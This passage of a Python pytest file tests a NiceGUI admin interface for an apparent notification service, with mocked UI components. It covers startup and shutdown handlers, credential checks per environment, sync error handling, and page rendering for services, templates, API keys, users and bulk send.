async def test_handle_service_search_event_no_value():
    mock_event = MagicMock(spec=[])
    with patch.object(page_services, "handle_service_search", new_callable=AsyncMock) as mock_search:
        await page_services.handle_service_search_event(mock_event)
        mock_search.assert_called_once_with(None)


# ===================================================================
# Sync handler test helpers (used by handle_full_sync tests above)
# ===================================================================


def _make_sync_test_state(env="development"):
    return SharedTestState(environment=env)


def _make_mock_badges():
    mock_status_badge = MagicMock()
    mock_status_badge.props = MagicMock()
    mock_sync_label = MagicMock()
    mock_sync_label.text = ""
    return mock_status_badge, mock_sync_label


# ===================================================================
# Category 1: Startup/Shutdown tests (lines 162, 167-168, 173-176)
# ===================================================================


@pytest.mark.asyncio
async def test_startup(initialized_db, mock_config):
    from nicegui import app as nicegui_app

    startup_fn = [h for h in nicegui_app._startup_handlers if getattr(h, "__name__", "") == "startup"][-1]

    original = _st.config
    _st.config = mock_config
    try:
        await startup_fn()
    finally:
        _st.config = original


@pytest.mark.asyncio
async def test_startup_runs_user_migration(initialized_db, mock_config):
    from nicegui import app as nicegui_app

    startup_fn = [h for h in nicegui_app._startup_handlers if getattr(h, "__name__", "") == "startup"][-1]

    original_config = _st.config
    original_encryption = _st.encryption
    _st.config = mock_config
    _st.encryption = MagicMock()
    try:
        with (
            patch("app.ui.state.create_all", new_callable=AsyncMock) as mock_create_all,
            patch("app.ui.state.ensure_default_hosts", new_callable=AsyncMock) as mock_hosts,
            patch("app.ui.state.migrate_plaintext_users_to_encrypted", new_callable=AsyncMock) as mock_migrate,
        ):
            await startup_fn()

        mock_create_all.assert_awaited_once()
        mock_hosts.assert_awaited_once()
        mock_migrate.assert_awaited_once_with(encryption=_st.encryption)
    finally:
        _st.config = original_config
        _st.encryption = original_encryption


@pytest.mark.asyncio
async def test_shutdown_via_handler(initialized_db):
    from nicegui import app as nicegui_app

    # app.on_shutdown doesn't return the function; retrieve from handlers
    shutdown_fn = [h for h in nicegui_app._shutdown_handlers if getattr(h, "__name__", "") == "shutdown"][-1]

    mock_client = AsyncMock()
    _st._active_api_clients.append(mock_client)
    try:
        with patch("app.ui.state.dispose_engine", new_callable=AsyncMock):
            await shutdown_fn()
            mock_client.aclose.assert_called_once()
            assert len(_st._active_api_clients) == 0
    finally:
        _st._active_api_clients.clear()


# ===================================================================
# Category 2: refresh_status_badge auth missing (lines 203-206)
# ===================================================================


@pytest.mark.asyncio
async def test_refresh_status_badge_auth_missing(initialized_db, mock_config):
    original_config = _st.config
    original_state = _st.state
    mock_config.use_mock_api = False
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    mock_badge = MagicMock()
    mock_badge.text = ""
    mock_badge.props = MagicMock()

    try:
        with patch.object(_st, "has_admin_auth", new_callable=AsyncMock, return_value=False):
            await _st.refresh_status_badge(mock_badge)
            assert _st.state.api_status == "auth missing"
            assert mock_badge.text == "API Status: Auth Missing"
            mock_badge.props.assert_called_once_with("color=pink")
    finally:
        _st.config = original_config
        _st.state = original_state


@pytest.mark.asyncio
async def test_refresh_status_badge_no_envs_enabled(initialized_db, mock_config):
    """Test that refresh_status_badge shows message when no envs are enabled."""
    original_config = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    _st.state.enabled_sync_environments = set()  # No envs enabled
    mock_badge = MagicMock()
    mock_badge.text = ""
    mock_badge.props = MagicMock()

    try:
        await _st.refresh_status_badge(mock_badge)
        assert mock_badge.text == "No environments enabled"
        mock_badge.props.assert_called_once_with("color=gray")
    finally:
        _st.config = original_config
        _st.state = original_state


# ===================================================================
# Category 3: handle_full_sync auth/401 branches (lines 231, 243-247)
# ===================================================================


@pytest.mark.asyncio
async def test_handle_full_sync_auth_missing(initialized_db, mock_config):
    original_config = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.state = _make_sync_test_state()
    mock_status_badge, mock_sync_label = _make_mock_badges()

    try:
        with (
            patch.object(_st, "ensure_admin_auth", new_callable=AsyncMock, return_value=False),
            patch.object(_st, "refresh_status_badge", new_callable=AsyncMock),
        ):
            result = await sync_handlers.handle_full_sync(mock_status_badge, mock_sync_label)
            assert result is False
    finally:
        _st.config = original_config
        _st.state = original_state


@pytest.mark.asyncio
async def test_handle_full_sync_unauthorized(initialized_db, mock_config):
    original_config = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.config.use_mock_api = True
    _st.state = _make_sync_test_state()
    mock_status_badge, mock_sync_label = _make_mock_badges()

    mock_response = MagicMock()
    mock_response.status_code = 401
    mock_response.is_client_error = True
    exc = httpx.HTTPStatusError("Unauthorized", request=MagicMock(), response=mock_response)

    try:
        with (
            patch.object(_st, "build_api_client", new_callable=AsyncMock) as mock_build,
            patch.object(_st, "refresh_status_badge", new_callable=AsyncMock),
            patch("app.ui.state.safe_notify"),
        ):
            mock_api = AsyncMock()
            mock_manager = AsyncMock()
            mock_manager.sync_all = AsyncMock(side_effect=exc)
            mock_build.return_value = mock_api
            with patch("app.ui.sync_handlers.SyncManager", return_value=mock_manager):
                await sync_handlers.handle_full_sync(mock_status_badge, mock_sync_label)
                # Sync fails for all envs, shows failed message
                assert "failed" in mock_sync_label.text
    finally:
        _st.config = original_config
        _st.state = original_state


# ===================================================================
# Category 6: has_admin_auth non-mock path (lines 791-793)
# ===================================================================


@pytest.mark.asyncio
async def test_has_admin_auth_real_with_creds(initialized_db, mock_config, mock_encryption):
    from app.repository import set_secure_setting

    original_config = _st.config
    original_encryption = _st.encryption
    mock_config.use_mock_api = False
    _st.config = mock_config
    _st.encryption = mock_encryption

    try:
        with patch.dict(os.environ, {"PYTEST_CURRENT_TEST": ""}, clear=False):
            result = await _st.has_admin_auth("development")
            assert result is False

            await set_secure_setting("basic_username_development", "user", mock_encryption)
            await set_secure_setting("basic_password_development", "pass", mock_encryption)
            result = await _st.has_admin_auth("development")
            assert result is True
    finally:
        _st.config = original_config
        _st.encryption = original_encryption


@pytest.mark.asyncio
async def test_get_missing_credentials_mock_api(mock_config):
    """get_missing_credentials returns empty list when use_mock_api is True."""
    original_config = _st.config
    mock_config.use_mock_api = True
    _st.config = mock_config
    try:
        result = await _st.get_missing_credentials("dev")
        assert result == []
    finally:
        _st.config = original_config


@pytest.mark.asyncio
async def test_get_missing_credentials_real_both_missing(initialized_db, mock_config, mock_encryption):
    """get_missing_credentials returns both fields when both missing."""
    original_config = _st.config
    original_encryption = _st.encryption
    mock_config.use_mock_api = False
    _st.config = mock_config
    _st.encryption = mock_encryption

    try:
        with patch.dict(os.environ, {"PYTEST_CURRENT_TEST": ""}, clear=False):
            result = await _st.get_missing_credentials("development")
            assert "username" in result
            assert "password" in result
    finally:
        _st.config = original_config
        _st.encryption = original_encryption


@pytest.mark.asyncio
async def test_get_missing_credentials_only_password_missing(initialized_db, mock_config, mock_encryption):
    """get_missing_credentials returns only password when username exists."""
    from app.repository import set_secure_setting

    original_config = _st.config
    original_encryption = _st.encryption
    mock_config.use_mock_api = False
    _st.config = mock_config
    _st.encryption = mock_encryption

    try:
        with patch.dict(os.environ, {"PYTEST_CURRENT_TEST": ""}, clear=False):
            await set_secure_setting("basic_username_development", "user", mock_encryption)
            result = await _st.get_missing_credentials("development")
            assert result == ["password"]
    finally:
        _st.config = original_config
        _st.encryption = original_encryption


@pytest.mark.asyncio
async def test_get_missing_credentials_only_username_missing(initialized_db, mock_config, mock_encryption):
    """get_missing_credentials returns only username when password exists."""
    from app.repository import set_secure_setting

    original_config = _st.config
    original_encryption = _st.encryption
    mock_config.use_mock_api = False
    _st.config = mock_config
    _st.encryption = mock_encryption

    try:
        with patch.dict(os.environ, {"PYTEST_CURRENT_TEST": ""}, clear=False):
            await set_secure_setting("basic_password_development", "pass", mock_encryption)
            result = await _st.get_missing_credentials("development")
            assert result == ["username"]
    finally:
        _st.config = original_config
        _st.encryption = original_encryption


@pytest.mark.asyncio
async def test_check_environments_credentials_all_configured(initialized_db, mock_config, mock_encryption):
    """check_environments_credentials returns empty dict when all configured."""
    from app.repository import set_secure_setting

    original_config = _st.config
    original_encryption = _st.encryption
    mock_config.use_mock_api = False
    _st.config = mock_config
    _st.encryption = mock_encryption

    try:
        with patch.dict(os.environ, {"PYTEST_CURRENT_TEST": ""}, clear=False):
            for env in ["dev", "staging"]:
                await set_secure_setting(f"basic_username_{env}", "user", mock_encryption)
                await set_secure_setting(f"basic_password_{env}", "pass", mock_encryption)

            result = await _st.check_environments_credentials(["dev", "staging"])
            assert result == {}
    finally:
        _st.config = original_config
        _st.encryption = original_encryption


@pytest.mark.asyncio
async def test_check_environments_credentials_some_missing(initialized_db, mock_config, mock_encryption):
    """check_environments_credentials returns dict with missing fields per env."""
    from app.repository import set_secure_setting

    original_config = _st.config
    original_encryption = _st.encryption
    mock_config.use_mock_api = False
    _st.config = mock_config
    _st.encryption = mock_encryption

    try:
        with patch.dict(os.environ, {"PYTEST_CURRENT_TEST": ""}, clear=False):
            # Configure dev fully
            await set_secure_setting("basic_username_dev", "user", mock_encryption)
            await set_secure_setting("basic_password_dev", "pass", mock_encryption)
            # Staging: only username
            await set_secure_setting("basic_username_staging", "user", mock_encryption)
            # Prod: nothing configured

            result = await _st.check_environments_credentials(["dev", "staging", "prod"])
            assert "dev" not in result  # Fully configured
            assert result["staging"] == ["password"]
            assert set(result["prod"]) == {"username", "password"}
    finally:
        _st.config = original_config
        _st.encryption = original_encryption


# ===================================================================
# Category 7: Page handler tests (lines 560-602, 859-2986, 2990)
# ===================================================================


def _ui_patches(mod_path, _make_mock):
    """Build common patches for a page module."""
    import importlib

    module = importlib.import_module(mod_path)
    patches = [
        patch(f"{mod_path}.ui.column", side_effect=_make_mock),
        patch(f"{mod_path}.ui.card", side_effect=_make_mock),
        patch(f"{mod_path}.ui.row", side_effect=_make_mock),
        patch(f"{mod_path}.ui.label", side_effect=_make_mock),
        patch(f"{mod_path}.ui.button", side_effect=_make_mock),
        patch(f"{mod_path}.ui.select", side_effect=_make_mock),
        patch(f"{mod_path}.ui.input", side_effect=_make_mock),
        patch(f"{mod_path}.ui.number", side_effect=_make_mock),
        patch(f"{mod_path}.ui.table", side_effect=_make_mock),
        patch(f"{mod_path}.ui.textarea", side_effect=_make_mock),
        patch(f"{mod_path}.ui.checkbox", side_effect=_make_mock),
        patch(f"{mod_path}.ui.markdown", side_effect=_make_mock),
        patch(f"{mod_path}.ui.dialog", side_effect=_make_mock),
        patch(f"{mod_path}.ui.notify"),
        patch(f"{mod_path}.ui.dropdown_button", side_effect=_make_mock),
        patch(f"{mod_path}.ui.refreshable", lambda fn: fn),
        patch(f"{mod_path}.ui.run_javascript"),
        patch(f"{mod_path}.ui.link"),
        patch(f"{mod_path}.ui.separator"),
        patch(f"{mod_path}.ui.switch", side_effect=_make_mock),
        patch(f"{mod_path}.ui.expansion", side_effect=_make_mock),
        patch(f"{mod_path}.ui.badge", side_effect=_make_mock),
        patch(f"{mod_path}.ui.scroll_area", side_effect=_make_mock),
        patch(f"{mod_path}.ui.upload", side_effect=_make_mock),
        patch(f"{mod_path}.ui.linear_progress", side_effect=_make_mock),
        patch(f"{mod_path}.ui.toggle", side_effect=_make_mock),
        patch(f"{mod_path}.ui.code", side_effect=_make_mock),
        patch(f"{mod_path}.ui.space", side_effect=_make_mock),
        patch(f"{mod_path}.ui.radio", side_effect=_make_mock),
        patch(f"{mod_path}.ui.element", side_effect=_make_mock),
        patch(f"{mod_path}.ui.icon", side_effect=_make_mock),
        patch(f"{mod_path}.ui.page", lambda *a, **kw: lambda fn: fn),
    ]
    # Optional patches — only add if the page module imports the name
    optional = {
        "build_shell": patch(
            f"{mod_path}.build_shell",
            return_value=(
                MagicMock(),
                MagicMock(),
                MagicMock(),
                MagicMock(),
                MagicMock(),
            ),
        ),
        "ensure_theme_preference": patch(f"{mod_path}.ensure_theme_preference", new_callable=AsyncMock),
        "refresh_status_badge": patch(f"{mod_path}.refresh_status_badge", new_callable=AsyncMock),
        "refresh_if_needed": patch(f"{mod_path}.refresh_if_needed", new_callable=AsyncMock),
        "add_copyable_slots": patch(f"{mod_path}.add_copyable_slots"),
        "handle_full_sync": patch(f"{mod_path}.handle_full_sync", new_callable=AsyncMock),
        "handle_entity_sync": patch(f"{mod_path}.handle_entity_sync", new_callable=AsyncMock),
        "metric_card": patch(f"{mod_path}.metric_card"),
        "list_services": patch(f"{mod_path}.list_services", new_callable=AsyncMock, return_value=[]),
        "list_templates": patch(f"{mod_path}.list_templates", new_callable=AsyncMock, return_value=[]),
        "list_api_keys": patch(f"{mod_path}.list_api_keys", new_callable=AsyncMock, return_value=[]),
        "list_users": patch(f"{mod_path}.list_users", new_callable=AsyncMock, return_value=[]),
        "list_sms_senders": patch(f"{mod_path}.list_sms_senders", new_callable=AsyncMock, return_value=[]),
        "list_provider_details": patch(
            f"{mod_path}.list_provider_details",
            new_callable=AsyncMock,
            return_value=[],
        ),
        "list_communication_items": patch(
            f"{mod_path}.list_communication_items",
            new_callable=AsyncMock,
            return_value=[],
        ),
        "list_inbound_numbers": patch(
            f"{mod_path}.list_inbound_numbers",
            new_callable=AsyncMock,
            return_value=[],
        ),
        "list_service_callbacks": patch(
            f"{mod_path}.list_service_callbacks",
            new_callable=AsyncMock,
            return_value=[],
        ),
        "upsert_service_callbacks": patch(f"{mod_path}.upsert_service_callbacks", new_callable=AsyncMock),
        "delete_service_callback": patch(
            f"{mod_path}.delete_service_callback",
            new_callable=AsyncMock,
            return_value=True,
        ),
        "list_local_keys": patch(
            f"{mod_path}.list_local_keys",
            new_callable=AsyncMock,
            return_value=[],
        ),
        "get_setting": patch(
            f"{mod_path}.get_setting",
            new_callable=AsyncMock,
            return_value=None,
        ),
        "get_secure_setting": patch(
            f"{mod_path}.get_secure_setting",
            new_callable=AsyncMock,
            return_value=None,
        ),
        "set_setting": patch(f"{mod_path}.set_setting", new_callable=AsyncMock),
        "set_secure_setting": patch(f"{mod_path}.set_secure_setting", new_callable=AsyncMock),
        "resolve_local_key": patch(
            f"{mod_path}.resolve_local_key",
            new_callable=AsyncMock,
            return_value=None,
        ),
        "mark_api_key_revoked": patch(f"{mod_path}.mark_api_key_revoked", new_callable=AsyncMock),
        "update_api_key_expiry": patch(f"{mod_path}.update_api_key_expiry", new_callable=AsyncMock),
        "add_local_key": patch(f"{mod_path}.add_local_key", new_callable=AsyncMock),
        "render_local_keys": patch(f"{mod_path}.render_local_keys", new_callable=AsyncMock),
        "update_provider_detail": patch(f"{mod_path}.update_provider_detail", new_callable=AsyncMock),
        "update_communication_item": patch(f"{mod_path}.update_communication_item", new_callable=AsyncMock),
        "clear_table_data": patch(f"{mod_path}.clear_table_data", new_callable=AsyncMock, return_value=0),
        "CLEARABLE_TABLES": patch(f"{mod_path}.CLEARABLE_TABLES", {}),
        "make_sortable": patch(f"{mod_path}.make_sortable"),
    }
    for attr, p in optional.items():
        if hasattr(module, attr):
            patches.append(p)
    return patches


@contextmanager
def mock_page_ui(mod_path):
    """Mock NiceGUI UI components for an extracted page module."""
    mock_obj = MagicMock()
    mock_obj.__enter__ = Mock(return_value=mock_obj)
    mock_obj.__exit__ = Mock(return_value=False)
    mock_obj.classes = MagicMock(return_value=mock_obj)
    mock_obj.props = MagicMock(return_value=mock_obj)

    def _make_mock(*args, **kwargs):
        new_mock = MagicMock()
        new_mock.__enter__ = Mock(return_value=new_mock)
        new_mock.__exit__ = Mock(return_value=False)
        new_mock.classes = MagicMock(return_value=new_mock)
        new_mock.props = MagicMock(return_value=new_mock)
        new_mock.style = MagicMock(return_value=new_mock)
        new_mock.on_click = MagicMock(return_value=new_mock)
        new_mock.on_value_change = MagicMock(return_value=new_mock)
        new_mock.set_options = MagicMock(return_value=new_mock)
        new_mock.on = MagicMock(return_value=new_mock)
        new_mock.add_slot = MagicMock(return_value=new_mock)
        new_mock.refresh = MagicMock()
        new_mock.value = kwargs.get("value", None)
        new_mock.text = ""
        new_mock.visible = True
        return new_mock

    from contextlib import ExitStack

    with ExitStack() as stack:
        for p in _ui_patches(mod_path, _make_mock):
            stack.enter_context(p)
        yield mock_obj


@pytest.mark.asyncio
async def test_dashboard_page(initialized_db, mock_config):
    original = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    try:
        with mock_page_ui("app.ui.pages.dashboard"):
            await page_dashboard.dashboard_page()
    finally:
        _st.config = original
        _st.state = original_state


@pytest.mark.asyncio
async def test_dashboard_page_passes_encryption_to_list_users(initialized_db, mock_config):
    original = _st.config
    original_state = _st.state
    original_encryption = _st.encryption
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    _st.encryption = MagicMock()
    try:
        with (
            mock_page_ui("app.ui.pages.dashboard"),
            patch("app.ui.pages.dashboard.get_view_environment", return_value="development"),
            patch("app.ui.pages.dashboard.list_users", new_callable=AsyncMock, return_value=[]) as mock_list_users,
        ):
            await page_dashboard.dashboard_page()
        mock_list_users.assert_awaited_once_with("development", encryption=_st.encryption)
    finally:
        _st.config = original
        _st.state = original_state
        _st.encryption = original_encryption


@pytest.mark.asyncio
async def test_services_page(initialized_db, mock_config):
    original = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    _st.service_search_query = ""
    try:
        with mock_page_ui("app.ui.pages.services"):
            with patch.object(page_services, "services_table", new_callable=AsyncMock):
                await page_services.services_page()
    finally:
        _st.config = original
        _st.state = original_state


@pytest.mark.asyncio
async def test_services_table_func(initialized_db, mock_config):
    original = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    _st.service_search_query = ""

    mock_obj = MagicMock()
    mock_obj.__enter__ = Mock(return_value=mock_obj)
    mock_obj.__exit__ = Mock(return_value=False)
    mock_obj.classes = MagicMock(return_value=mock_obj)
    mock_obj.props = MagicMock(return_value=mock_obj)
    mock_obj.add_slot = MagicMock(return_value=mock_obj)
    mock_obj.on = MagicMock(return_value=mock_obj)

    try:
        with (
            patch(
                "app.ui.pages.services.list_services",
                new_callable=AsyncMock,
                return_value=[],
            ),
            patch(
                "app.ui.pages.services.count_active_api_keys_by_service",
                new_callable=AsyncMock,
                return_value={},
            ),
            patch("app.ui.pages.services.ui.table", return_value=mock_obj),
            patch("app.ui.pages.services.ui.row", return_value=mock_obj),
            patch("app.ui.pages.services.ui.button", return_value=mock_obj),
            patch("app.ui.pages.services.ui.space"),
            patch("app.ui.pages.services.add_copyable_slots"),
            patch("app.ui.pages.services.add_export_button"),
        ):
            await page_services.services_table.func(lambda: None)
    finally:
        _st.config = original
        _st.state = original_state


@pytest.mark.asyncio
async def test_services_table_func_with_selection(initialized_db, mock_config):
    """services_table renders edit button and selection mode when given selected_service."""
    original = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    _st.service_search_query = ""

    mock_obj = MagicMock()
    mock_obj.__enter__ = Mock(return_value=mock_obj)
    mock_obj.__exit__ = Mock(return_value=False)
    mock_obj.classes = MagicMock(return_value=mock_obj)
    mock_obj.props = MagicMock(return_value=mock_obj)
    mock_obj.add_slot = MagicMock(return_value=mock_obj)
    mock_obj.on = MagicMock(return_value=mock_obj)

    selected_service: dict = {"id": "old-value"}

    try:
        with (
            patch(
                "app.ui.pages.services.list_services",
                new_callable=AsyncMock,
                return_value=[],
            ),
            patch(
                "app.ui.pages.services.count_active_api_keys_by_service",
                new_callable=AsyncMock,
                return_value={},
            ),
            patch("app.ui.pages.services.ui.table", return_value=mock_obj),
            patch("app.ui.pages.services.ui.row", return_value=mock_obj),
            patch("app.ui.pages.services.ui.button", return_value=mock_obj),
            patch("app.ui.pages.services.ui.space"),
            patch("app.ui.pages.services.add_copyable_slots"),
            patch("app.ui.pages.services.add_export_button"),
        ):
            await page_services.services_table.func(lambda: None, selected_service, lambda: None)
            # selected_service should be cleared on refresh
            assert selected_service == {}
    finally:
        _st.config = original
        _st.state = original_state


@pytest.mark.asyncio
async def test_templates_page(initialized_db, mock_config):
    original = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    try:
        with mock_page_ui("app.ui.pages.templates"):
            await page_templates.templates_page()
    finally:
        _st.config = original
        _st.state = original_state


@pytest.mark.asyncio
async def test_api_keys_page(initialized_db, mock_config):
    original = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    try:
        with mock_page_ui("app.ui.pages.api_keys"):
            await page_api_keys.api_keys_page()
    finally:
        _st.config = original
        _st.state = original_state


@pytest.mark.asyncio
async def test_api_key_emails_page(initialized_db, mock_config):
    original = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    try:
        with mock_page_ui("app.ui.pages.api_key_service"):
            await page_api_key_service.api_key_emails_page()
    finally:
        _st.config = original
        _st.state = original_state


@pytest.mark.asyncio
async def test_users_page(initialized_db, mock_config):
    original = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    try:
        with mock_page_ui("app.ui.pages.users"):
            await page_users.users_page()
    finally:
        _st.config = original
        _st.state = original_state


@pytest.mark.asyncio
async def test_users_page_passes_encryption_to_list_users(initialized_db, mock_config):
    original = _st.config
    original_state = _st.state
    original_encryption = _st.encryption
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    _st.encryption = MagicMock()
    try:
        with (
            mock_page_ui("app.ui.pages.users"),
            patch("app.ui.pages.users.get_view_environment", return_value="development"),
            patch("app.ui.pages.users.list_users", new_callable=AsyncMock, return_value=[]) as mock_list_users,
        ):
            await page_users.users_page()
        mock_list_users.assert_awaited_once_with("development", encryption=_st.encryption)
    finally:
        _st.config = original
        _st.state = original_state
        _st.encryption = original_encryption


@pytest.mark.asyncio
async def test_sms_senders_page(initialized_db, mock_config):
    original = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    try:
        with mock_page_ui("app.ui.pages.sms_senders"):
            await page_sms_senders.sms_senders_page()
    finally:
        _st.config = original
        _st.state = original_state


@pytest.mark.asyncio
async def test_provider_details_page(initialized_db, mock_config):
    original = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    try:
        with mock_page_ui("app.ui.pages.provider_details"):
            await page_provider_details.provider_details_page()
    finally:
        _st.config = original
        _st.state = original_state


@pytest.mark.asyncio
async def test_communication_items_page(initialized_db, mock_config):
    original = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    try:
        with mock_page_ui("app.ui.pages.comm_items"):
            await page_comm_items.communication_items_page()
    finally:
        _st.config = original
        _st.state = original_state


@pytest.mark.asyncio
async def test_inbound_numbers_page(initialized_db, mock_config):
    original = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    try:
        with mock_page_ui("app.ui.pages.inbound_numbers"):
            await page_inbound_numbers.inbound_numbers_page()
    finally:
        _st.config = original
        _st.state = original_state


@pytest.mark.asyncio
async def test_service_callbacks_page(initialized_db, mock_config):
    original = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    try:
        with mock_page_ui("app.ui.pages.service_callbacks"):
            await page_service_callbacks.service_callbacks_page()
    finally:
        _st.config = original
        _st.state = original_state


def test_service_callbacks_page_uses_shared_format_statuses():
    from app.ui.callback_helpers import format_statuses

    assert page_service_callbacks.format_statuses is format_statuses


def test_service_callbacks_page_uses_shared_pure_helpers():
    # These are pure and unit-tested in tests/test_callback_helpers.py. Re-inlining any of
    # them into the page would put the logic back behind a `# pragma: no cover`.
    from app.ui.callback_helpers import (
        create_statuses_default,
        edit_statuses_control_state,
        resolve_row_environment,
    )

    assert page_service_callbacks.resolve_row_environment is resolve_row_environment
    assert page_service_callbacks.edit_statuses_control_state is edit_statuses_control_state
    assert page_service_callbacks.create_statuses_default is create_statuses_default


def test_service_callbacks_unknown_environment_message_names_the_remedy():
    assert "Sync Service Callbacks" in page_service_callbacks.UNKNOWN_ENVIRONMENT_MESSAGE


@pytest.mark.asyncio
async def test_send_page(initialized_db, mock_config):
    original = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    try:
        with mock_page_ui("app.ui.pages.send"):
            await page_send.send_page()
    finally:
        _st.config = original
        _st.state = original_state


@pytest.mark.asyncio
async def test_bulk_send_page(initialized_db, mock_config):
    original = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    try:
        with mock_page_ui("app.ui.pages.bulk_send"):
            await page_bulk_send.bulk_send_page()
    finally:
        _st.config = original
        _st.state = original_state


@pytest.mark.asyncio
async def test_bulk_send_page_passes_encryption_to_list_users(initialized_db, mock_config):
    original = _st.config
    original_state = _st.state
    original_encryption = _st.encryption
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    _st.encryption = MagicMock()

    send_all_callback = None

    def make_component() -> MagicMock:
        component = MagicMock()
        component.__enter__ = Mock(return_value=component)
        component.__exit__ = Mock(return_value=False)
        component.classes = MagicMock(return_value=component)
        component.props = MagicMock(return_value=component)
        component.on_click = MagicMock(return_value=component)
        component.on_value_change = MagicMock(return_value=component)
        component.set_options = MagicMock(return_value=component)
        component.on = MagicMock(return_value=component)
        component.add_slot = MagicMock(return_value=component)
        component.refresh = MagicMock()
        component.text = ""
        component.value = None
        return component

    def capture_select(options=None, value=None, label=None, **_kwargs):
        component = make_component()
        component.value = value
        if label == "Service":
            component.value = "svc-1"
        elif label == "API Key":
            component.value = "key-1"
        elif label == "Template":
            component.value = "tmpl-1"
        return component

    def capture_button(label, **kwargs):
        nonlocal send_all_callback
        if label == "Send to ALL":
            send_all_callback = kwargs.get("on_click")
        return make_component()

    mock_user = SimpleNamespace(
        id="user-1",
        email_address="user@example.com",
        state="active",
        blocked=False,
    )
    mock_api = MagicMock()
    mock_api.send_notification = AsyncMock(return_value={"id": "ok"})
    mock_service = SimpleNamespace(id="svc-1", name="Service 1", environment="development")
    mock_key = SimpleNamespace(id="key-1", key_name="key-1")
    mock_template = SimpleNamespace(id="tmpl-1", name="Template 1", subject=None, content=None)

    try:
        with (
            mock_page_ui("app.ui.pages.bulk_send"),
            patch("app.ui.pages.bulk_send.ui.select", side_effect=capture_select),
            patch("app.ui.pages.bulk_send.ui.button", side_effect=capture_button),
            patch("app.ui.pages.bulk_send.list_services", new_callable=AsyncMock, return_value=[mock_service]),
            patch("app.ui.pages.bulk_send.list_local_keys", new_callable=AsyncMock, return_value=[mock_key]),
            patch("app.ui.pages.bulk_send.list_templates", new_callable=AsyncMock, return_value=[mock_template]),
            patch(
                "app.ui.pages.bulk_send.list_users", new_callable=AsyncMock, return_value=[mock_user]
            ) as mock_list_users,
            patch("app.ui.pages.bulk_send.resolve_local_key", new_callable=AsyncMock, return_value="secret"),
            patch("app.ui.pages.bulk_send.build_api_client", new_callable=AsyncMock, return_value=mock_api),
            patch("app.ui.pages.bulk_send.open", create=True),
            patch("app.ui.pages.bulk_send.json.dump"),
        ):
            await page_bulk_send.bulk_send_page()
            assert send_all_callback is not None
            await send_all_callback()
        mock_list_users.assert_awaited_once_with("development", encryption=_st.encryption)
    finally:
        _st.config = original
        _st.state = original_state
        _st.encryption = original_encryption


@pytest.mark.asyncio
async def test_settings_page(initialized_db, mock_config):
    original = _st.config
    original_state = _st.state
    original_encryption = _st.encryption
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    _st.encryption = EncryptionManager(mock_config.master_key, salt_provider=DbSaltProvider())
    try:
        with mock_page_ui("app.ui.pages.settings_page"):
            await page_settings.settings_page()
    finally:
        _st.config = original
        _st.state = original_state
        _st.encryption = original_encryption


@pytest.mark.asyncio
async def test_render_local_keys_func(initialized_db, mock_config):
    original = _st.config
    _st.config = mock_config

    mock_obj = MagicMock()
    mock_obj.__enter__ = Mock(return_value=mock_obj)
    mock_obj.__exit__ = Mock(return_value=False)
    mock_obj.classes = MagicMock(return_value=mock_obj)
    mock_obj.props = MagicMock(return_value=mock_obj)
    mock_obj.add_slot = MagicMock(return_value=mock_obj)
    mock_obj.on = MagicMock(return_value=mock_obj)

    try:
        with (
            patch(
                "app.ui.pages.settings_page.list_local_keys",
                new_callable=AsyncMock,
                return_value=[],
            ),
            patch("app.ui.pages.settings_page.ui.table", return_value=mock_obj),
            patch("app.ui.pages.settings_page.ui.row", return_value=mock_obj),
            patch("app.ui.pages.settings_page.add_copyable_slots"),
            patch("app.ui.pages.settings_page.add_export_button"),
        ):
            await page_settings.render_local_keys.func()
    finally:
        _st.config = original


def test_ui_run_guard():
    """Test that main module imports correctly and pages are registered."""

    # After Phase 3B, pages live in app.ui.pages.*; main.py is just the entry point.
    assert hasattr(page_api_keys, "api_keys_page")


# ===================================================================
# Re-raise tests for non-401 HTTPStatusError in sync handlers
# ===================================================================


@pytest.mark.asyncio
async def test_handle_full_sync_reraises_non_401(initialized_db, mock_config):
    original_config = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.config.use_mock_api = True
    _st.state = _make_sync_test_state()
    mock_status_badge, mock_sync_label = _make_mock_badges()

    mock_response = MagicMock()
    mock_response.status_code = 500
    exc = httpx.HTTPStatusError("Server Error", request=MagicMock(), response=mock_response)

    try:
        with (
            patch.object(_st, "build_api_client", new_callable=AsyncMock) as mock_build,
            patch.object(_st, "refresh_status_badge", new_callable=AsyncMock),
        ):
            mock_manager = AsyncMock()
            mock_manager.sync_all = AsyncMock(side_effect=exc)
            mock_build.return_value = AsyncMock()
            with patch("app.ui.sync_handlers.SyncManager", return_value=mock_manager):
                # Exceptions are caught by asyncio.gather with return_exceptions
                await sync_handlers.handle_full_sync(mock_status_badge, mock_sync_label)
                # Should show failure in label
                assert "failed" in mock_sync_label.text
    finally:
        _st.config = original_config
        _st.state = original_state


@pytest.mark.asyncio
